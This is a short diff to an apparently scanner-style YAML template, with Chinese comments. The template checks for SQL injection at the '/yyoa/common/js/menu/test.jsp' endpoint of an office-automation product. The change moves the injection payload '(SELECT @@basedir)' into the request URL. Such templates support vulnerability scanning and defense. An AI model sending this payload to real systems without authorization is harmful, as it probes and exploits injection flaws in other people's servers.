@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/yyoa/common/js/menu/test.jsp"
+  - url : "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
 
 #payload
 - payload:
-  - payload: "doType=101&S1=(SELECT%20@@basedir)"
+  - payload: "isNone"
 
 #response包里状态码
 - status:
